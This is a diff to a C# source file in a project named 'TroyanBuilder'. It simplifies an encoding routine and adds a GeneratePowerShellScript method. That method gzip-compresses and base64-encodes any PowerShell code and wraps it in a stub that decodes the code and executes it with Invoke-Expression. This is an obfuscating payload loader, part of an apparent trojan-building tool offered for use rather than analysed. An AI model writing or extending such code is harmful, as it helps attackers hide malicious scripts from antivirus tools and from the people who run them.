@@ -1,6 +1,4 @@
-﻿using System;
-using System.IO;
-using System.IO.Compression;
+﻿using System.IO.Compression;
 using System.Text;
 
 namespace TroyanBuilder
@@ -15,7 +13,7 @@ namespace TroyanBuilder
             var bytes = Encoding.UTF8.GetBytes(input);
             return EncodeBytes(bytes, filePath);
         }
-        
+
         public static string Encode(string input)
         {
             var bytes = Encoding.UTF8.GetBytes(input);
@@ -29,9 +27,10 @@ namespace TroyanBuilder
             {
                 zipStream.Write(bytes, 0, bytes.Length);
             }
+
             var compressedBytes = outputStream.ToArray();
             var base64 = Convert.ToBase64String(compressedBytes);
-            return EncodeBase64(base64);
+            return base64;
         }
 
         public static string EncodeBytes(byte[] bytes, string filePath)
@@ -52,6 +51,32 @@ namespace TroyanBuilder
             }
 
             return customBase64.ToString();
+        }
+
+
+
+        public static string GeneratePowerShellScript(string powerShellCode)
+        {
+            var encoded = Encode(powerShellCode);
+            return $@"
+$EncodedScript = ""{encoded}""
+
+function Decode-Script {{
+    param([string]$EncodedText)
+    $CompressedBytes = [Convert]::FromBase64String($EncodedText)
+    $MemoryStream = New-Object System.IO.MemoryStream(, $CompressedBytes)
+    $GzipStream = New-Object System.IO.Compression.GzipStream($MemoryStream, [System.IO.Compression.CompressionMode]::Decompress)
+    $StreamReader = New-Object System.IO.StreamReader($GzipStream, [System.Text.Encoding]::UTF8)
+    $StreamReader.ReadToEnd()
+}}
+
+function Run-Script {{
+    $DecodedScript = Decode-Script -EncodedText $EncodedScript
+    Invoke-Expression $DecodedScript
+}}
+
+Run-Script
+";
         }
     }
 }
